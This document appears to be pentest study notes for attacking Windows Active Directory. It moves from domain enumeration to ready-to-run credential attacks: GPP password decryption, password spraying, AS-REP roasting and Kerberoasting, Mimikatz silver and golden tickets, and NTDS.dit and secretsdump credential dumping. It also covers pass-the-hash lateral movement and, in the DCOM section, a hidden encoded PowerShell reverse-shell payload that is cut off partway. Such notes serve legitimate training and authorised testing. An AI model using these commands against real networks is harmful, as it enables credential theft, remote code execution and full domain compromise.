p## Section 1 Active Directory Introduction
- Don't ignore when you get access to another low-privileged user
	- Just begin the enumeration again because they may have different access
## Section 2 Manual Enumeration
### 21.2.1 Enumeration Using Legacy Windows Tools
- Get all users on the domain with 
```batch
net user /domain
```
- Get detailed information on a specific user with 
```batch
net user <USERNAME> /domain
```
- Get info on groups in the domain with 
```batch
net group /domain
```
- Look for custom groups that were created and enumerate those first
- Enumerate a specific group with
```batch
net group <GROUP_NAME> /domain
```
- Check local admins with
```batch
net localgroup Administrators
```
### 21.2.2 Enumerating Active Directory Using PowerShell and .NET Classes
- Because there can be multiple DCs in a domain it is important to find the Primary Domain Controller (PDC)
	- There can only be one of these per domain and it holds the PdcRoleOwner property
- Three parts to LDAP communication
```
LDAP://<HOSTNAME>[:PORT_NUMBER(optional)][/DistinguishedName]
```
- To get the Domain Class and the GetCurrentdomain method run the following command in powershell
```PowerShell
[System.DirectoryServices.ActiveDirectory.Domain]
```
- Check the resources file for the Get_domain_information.ps1 file
- Bypass execution policy in powershell with 
```PowerShell
powershell -ep bypass
```
- Check the resources folder for the domain_enumeration.ps1 file
- Check the resources folder for the domain_enumeration_v2.ps1 file
### Adding Search Functionality To Our Script
- Check resources folder for domain_enumeration_complete.ps1
- Check resources folder for domain_enum_function.ps1
- How to use domain_enum_function.ps1
```PowerShell
Import-Module .\domain_enum_function.ps1
```
- Filter on a specific samAccountType
```PowerShell
LDAPSearch -LDAPQuery "(samAccountType=805306368)"
```
- To filter on an objectclass group
```PowerShell
LDAPSearch -LDAPQuery "(objectclass=group)"
```
- To enumerate every group available in the domain and also display the user members we can pipe the output in a new variable and use a foreach loop tat will print the property for a group.
	- This allows us to select specific attributes we are interested in
	- For example let's focus on the CN and member attributes with 
```PowerShell
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group))) {$group.properties | select {$_.cn}, {$_.member}}
```
- To specify the sales department use 
```PowerShell
$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
$sales.properties.member
```
### 21.2.4 AD Enumeration With Powerview
- First 
```PowerShell
powershell -ep bypass
```
```PowerShell
Import-Module .\PowerView.ps1
```
- Get Domain info
```PowerShell
Get-NetDomain
```
- Get cn for users in Get-NetUser
```PowerShell
Get-NetUser | select cn 
```
- Find users with old or weak passwords
```PowerShell
Get-NetUser | select cn,pwlastset,lastlogon
```
- Enumerate groups
```PowerShell
Get-NetGroup 
```
- Clean Group enumeration
```PowerShell
Get-NetGroup | select cn
```
- Enumerate specific groups
```PowerShell
Get-NetGroup "<GROUPNAME>" 
```
- Enumerate specific group for members 
```PowerShell
Get-NetGroup "<GROUPNAME>" | select member
```
- Find vulnerable operating systems 
```PowerShell
Get-NetComputer | select operatingsystem,operatingsystemversion
```
- Scan the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
```PowerShell
Find-LocalAdminAccess
```
### 21.3.2 Getting An Overview - Permissions and Logged On Users
- You may not want to go straight to domain admins because that is suspicious
	- There may be other accounts that have higher privileges than domain user that we could use to maintain access
		- Like a user from the Service Accounts Group which may have local administrator privileges on specific services
- PowerView find any administrative access for a user
```PowerShell
Find-LocalAdminAccess
```
- PowerView find any logged in users with
```PowerShell
Get-NetSession -ComputerName <COMputeRNAME>
```
- If there is no output to make sure we aren't receiving any error messages use
```PowerShell
Get-NetSession -ComputerName <COMPUTERNAME> -Verbose
```
- If the information is off you can troubleshoot permissions with 
```PowerShell
Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity | fl
```
- To find active sessions if Get-NetSessions is not available we can use PsLoggedon from the Sysinternals suite which may be installed by default
	- It is enabled on
		- Windows Server 2012 R2
		- Windows Server 2016 (1607)
		- Windows Server 2019 (1809)
		- Windows Server 2022 (21H2)
	- If it is enabled the service will stop after 10 minutes of activity to save resources
		- But it will re-enable with an automatic trigger when we connect with PsLoggedon
		- To run this you use
```PowerShell
.\PsLoggedon.exe \\Computername
```
### 21.3.3 Enumeration Through Service Principal Names
- To enumerate SPNs on the domain both clients and servers use 
```PowerShell
setspn -L
```
- If you know a specific service account name use 
```PowerShell
setspn -L <SERVICE_NAME> (e.g. iis_service)
```
- PowerView get SPNs and pipe output to samaccountname and serviceprincipalname use
```PowerShell
Get-NetUser -SPN | select samaccountname, serviceprincipalname
```
### 21.3.4 Enumerating Object Permissions
- List of the most important types of permissions on an ACE
	- GenericAll:
		- Full permissions on the object 
	- GenericWrite:
		- Edit certain attributes on the object 
	- WriteOwner
		- Change ownership of the object
	- WriteDACL
		- Edit the ACE's applied to the object 
	- AllExtendedRights
		- Change password
		- Reset password 
		- etc.
	- ForceChangePassword:
		- Password change for the object self (Self-Membership)
			- Add ourselves to for example a group
- Enumerate ACEs for a known identity with PowerView
```PowerShell
Get-ObjectAcl -Identity stephanie
```
- Convert SID to name with PowerView
```PowerShell
Convert-SidToName <SID>
```
- Highest permission you can have on an AD object is GenericAll
- Most of the time you are only interested in the following fields in Get-ObjectAcl
	- ActiveDirectoryRights
	- Security Identifier
	- Object SID is nice to have but it's not needed when we are enumerating specific objects in AD since it will only contain the SID for the object we are enumerating 
- Generate clean and manageable object 
	- powershell -eq flag to filter the ActiveDirectoryRights property
		- Only displaying the values that = GenericAll 
		- Pipe the results into selecting only displaying the SecurityIdentifier and ActiveDirectoryRights with 
```PowerShell
Get-ObjectAcl -Identity "Management Department" | ?{$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier, ActiveDirectoryRights
```
- Convert multiple SIDs to names with PowerView
```PowerShell
"<SID>","<SID>" | Convert-SidToName
```
- Add a powerful user to an AD group
```batch
net group "Management Department" stephanie /add /domain
```
- Verify with 
```PowerShell
Get-NetGroup "Management Department" | select member
```
- Remove the user with 
```PowerShell
net group "Management Department" stephanie /del /domain
```
### 21.3.5 Enumerating Domain Shares 
- Enumerate domain shares with PowerView
```PowerShell
Find-DomainShare
```
- An important Domain share to investigate is SYSVOL 
	- May include files and folders that reside on the domain controller itself 
	- This particular share is typically used for various domain policies and scripts 
	- By default the SYSVOL folder is mapped to 
		- %SystemRoot%\SYSVOL\Sysvol\domain-name
		- Example enumeration is 
			- \\dc1.corp.com\Sysvol\corp.com
- During an assessment investigate every folder such as the policies and scripts folder with 
```PowerShell
ls \\dc1.corp.com\Sysvol\corp.com\Policies
```
```PowerShell
ls \\dc1.corp.com\Sysvol\corp.com\Scripts
```
- Look for encrypted passwords with a value of cpassword in old configuration files of backups in ml format
	- Commenly GPP-stored passwords are encrypted with AES-256 
	- The private key for the encryption has been posted on MDSDN
	- We can use this key to decrypt the password with 
```
gpp-decrypt "<PASSWORD_STRING>"
```
## Section 4 Active Directory - Automated Enumeration

### 21.4.1 Collecting Data with SharpHound
- Import Sharphound to memory 
```PowerShell
powershell -ep bypass
```
```PowerShell
Import-Module .\Sharphound.ps1
```
- The following must be run before running Sharphound
```PowerShell
Invoke-BloodHound
```
- Get help for Invoke-BloodHound with
```PowerShell
Get-Help Invoke-BloodHound
```
- Begin with Collection method 
	- This describes the various collection methods
		- We will often gather ALL data 
		- This performs all collection methods except for local group policies 
		- By default Sharphound will gather the data in JSON files and automatically zip them making it easy for us to transfer the file to kali later
		- We will have to save this file on our desktop with a "<FILE_NAME>" prefix
		- Example 
```PowerShell
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop -OutputPrefix "corp audit"
```
- BloodHound automatically creates the .bin cache file to speed up data collection 
	- This is not needed for our analysis and we can safely delete it.
- SharpHound also supports logging
	- This means that the collector will run cyclical queries of our choosing over a period of time 
- While the collection we used previously created a snapshot over the domain
	- Running it in a loop may gather additional data as the environment changes 
- The cache file speeds up the process 
	- For example if a user logged on after we collectedd a snapshot we would have missed it in our snapshot but we will not miss it with the looping functionality
		- NOT NEEDED FOR THE TEST 
- Bloodhound-python
```bash
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -ns <RHOST> -d <DOMAIN> -c all
#Output saved in kali machine
```
### 21.4.2 Analyzing Data Using BloodHound
- Run neo4j with 
```bash
sudo neo4j start
```
- Default credentials for neo4j are 
	- neo4j:neo4j
- After running neo4j start bloodhound from the terminal with
```bash
bloodhound
```
- To logon use the neo4j username and password
- Upload the zip file from SharpHound via the upload gui
- In BloodHound analysis starts with Find all Domain Admins under domain information 
	- This gives you a graph
- Then focus on the shortest paths shown in the Analysis tab
	- This shows the shortest path to domain admin
	- In a relationship click the line between nodes and click ?help and BloodHound will show additional information
## LDAPDOMAINDUMP
- These files contain information in a well structured webpage format
```bash
sudo ldapdomaindump ldaps://<IP> -u '<USERNAME>' -p '<PASSWORD>'
```
## PlumHound
- Link: [https://github.com/PlumHound/PlumHound](https://github.com/PlumHound/PlumHound) install from the steps mentioned.
- Keep both Bloodhound and Neo4j running as this tool acquires information from them.
```bash
sudo python3 plumhound.py --easy -p <NEO4JPASSWORD>
```
```bash
python3 plumhound.py -x tasks/default.tasks -p <NEO4jPASSWORD>
```
```bash
firefox index.html
```
## PingCastle
- [www.pingcastle.com](http://www.pingcastle.com/) - Download Zip file from here.
- This needs to be run on windows machine, just hit enter and give the domain to scan.
- It gives a report at end of scan.
## PsLoggedon
- Check to see user logons at remote system of a domain
```PowerShell
.\PsLoggedon.exe \\<COMPUTERNAME>
```
## GPP or CPassword
- Impacket tools
- With a NULL session
```bash
Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
```
- With cleartext credentials
```bash
Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
```
- Pass the hash (NT Hash)
```bash
Get-GPPPassword.py -hashes:'NTHASH' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
```
- Parse a local file
```bash
Get-GPPPassword.py -xmlfile '/path/to/policy.xml' 'LOCAL'
```
- If it's an SMB share =If SYSVOL share or any share which domain name as folder name do the following:
```
#Download the whole share
https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords%20In%20SYSVOL.md
#Navigate to the downloaded folder
grep -inr "cpassword"
```
- Crackmapexec
```bash
crackmapexec smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
```
```bash
crackmapexec smb <TARGET[s]> -u <USERNAME> -H <LMHASH:NTLM:HASH> -d <DOMAIN> -m gpp_password
```
- Decrypting the CPassword
```bash
gpp-decrypt "cpassword"
```
## Password Spraying
### Crackmapexec
```bash
crackmapexec smb <IP> -u <USERS.TXT> -p 'pass' -d <DOMAIN> --continue-on-success
```
### Kerbrute
```bash
kerbrute passwordspray -d <DOMAIN> .\usernames.txt "pass"
```
## AS-REP Roasting
- Get hash of AS-REP roastable accounts from kali
```bash
impacket-GetNPUsers -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:<PASSWORD> -request
```
- Get from compromised windows host
```batch
.\Rubeus.exe asreproast /nowrap
```
- Crack the hashes
```bash
hashcat -m 18200 hashes.txt wordlist.txt --force
```
## Kerberoasting
- Dumping from compromised windows host and saving with a custom name
```batch
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
- Impacket from kali machine
```bash
impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:<PASSWORD> -request
```
- Cracking the passwords
```bash
hashcat -m 13100 hashes.txt wordlist.txt --force
```
## Silver Tickets
- Obtaining the hash of an SPN user using Mimikatz
```
privilege::debug
```
```
#Get NTLM hash of the SPN account here
sekurlsa::logonpasswords
```
- Getting Domain SID
```batch
whoami /user
```
```
#this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain   SID is "S-1-5-21-1987370270-658905905-1781884369"
```
- Forging silver ticket ft Mimikatz
```
kerberos::golden /sid:<DOMAIN_SID> /domain:<DOMAIN> /ptt /target:<TARGETSYSTEM.DOMAIN> /service:<SERVICE_NAME> /rc4:<NTLM_HASH> /user:<NEW_USER>
```
```
exit
```
```
#Check tickets with 
klist
```
- Accessing service
```PowerShell
iwr -UseDefaultCredentials <SERVICENAME>://<COMPUTERNAME>
```
## Secretsdump
```bash
secretsdump.py <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
```
- For local user
```bash
secretsdump.py <USERNAME>@<IP> -hashes <LM_HASH:NTLM_HASH>
```
- For domain user
```bash
secretsdump.py <DOMAIN>/<USERNAME>@<IP> -hashes <LM_HASH:NTLM_HASH>
```
## Dumping NTDS.dit
- Use -just-dc-ntlm option with any of the secretsdump commands to dump ntds.dit
```bash
secretsdump.py <DOMAIN>/<USERNAME>:<PASSWORD>@<IP> -just-dc-ntlm
```
## Lateral Movement
### PSExec SMBExec WMIExec AtEXEC
```bash
psexec.py <domain>/<user>:<password1>@<IP>
# the user should have write access to Admin share then only we can get sesssion

psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
#we passed full hash here

smbexec.py <domain>/<user>:<password1>@<IP>

smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
#we passed full hash here

wmiexec.py <domain>/<user>:<password1>@<IP>

wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
#we passed full hash here

atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command>
#we passed full hash here
```
### Winrs
- Run this and check whether the user has access on the machine, if you have access then run a powershell reverse-shell
	- run this on windows session
```PowerShell
winrs -r:<COMPUTERNAME> -u:<USERNAME> -p:<PASSWORD> "<COMMAND>"
```
### Crackmapexec
```bash
crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp} #supported services
crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success # Bruteforcing attack, smb can be replaced. Shows "Pwned"
crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success | grep '[+]' #grepping the way out!
crackmapexec smb <Rhost/range> -u user.txt -p 'password' --continue-on-success  #Password spraying, viceversa can also be done

#Try --local-auth option if nothing comes up
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --shares #lists all shares, provide creds if you have one
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --disks
crackmapexec smb <DC-IP> -u 'user' -p 'password' --users #we need to provide DC ip
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sessions #active logon sessions
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --pass-pol #dumps password policy
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sam #SAM hashes
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --lsa #dumping lsa secrets
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --ntds #dumps NTDS.dit file
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --groups {groupname} #we can also run with a specific group and enumerated users of that group.
crackmapexec smb <Rhost/range> -u 'user' -p 'password' -x 'command' #For executing commands, "-x" for cmd and "-X" for powershell command

#Pass the hash
crackmapexec smb <ip or range> -u username -H <full hash> --local-auth
#We can run all the above commands with hash and obtain more information

#crackmapexec modules
crackmapexec smb -L #listing modules
crackmapexec smb -M mimikatx --options #shows the required options for the module
crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz #runs default command
crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug' #runs specific command-M 
```
### Pass the ticket
```batch
.\mimikatz.exe
```
```
sekurlsa::tickets /export
```
```
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
```
```
klist
```
```
dir \\<RHOST>\admin$
```
### DCOM
```PowerShell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))

$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```
### Golden Ticket
- Get the krbtgt hash
```batch
.\mimikatz.exe
```
```
privilege::debug
```
```
lsadump::lsa /inject /name:krbtgt
```
```
lsadump::lsa /patch
```
```
lsadump::dcsync /user:krbtgt
```
- Remove any existing tickets
```
kerberos::purge
```
- Sample Command
```
kerberos::golden /user:sathvik /domain:evilcorp.com /sid:S-1-5-21-510558963-1698214355-4094250843 /krbtgt:4b4412bbe7b3a88f5b0537ac0d2bf296 /ticket:golden
```
- Obtaining Access
```
mimikatz.exe #No need for hightest privileges
```
```
kerberos::ptt golden
```
```
misc::cmd
```
### Shadow Copies
```
vshadow.exe -nw -p C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```